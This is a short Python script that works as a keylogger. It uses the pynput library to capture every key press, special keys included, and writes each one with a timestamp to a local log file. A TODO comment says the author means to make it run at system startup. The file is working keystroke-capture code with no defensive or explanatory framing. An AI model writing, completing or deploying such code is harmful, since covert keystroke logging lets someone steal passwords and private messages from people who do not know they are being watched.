import pynput
import logging

# TODO: set the program as startup

# Specify the file path where you want to store the logged keys
log_file_path = "key_log.txt"

# Configure logging to write to the specified file
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    """Function to capture and log key presses."""
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Create a keyboard listener
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()  # Run the listener in the background


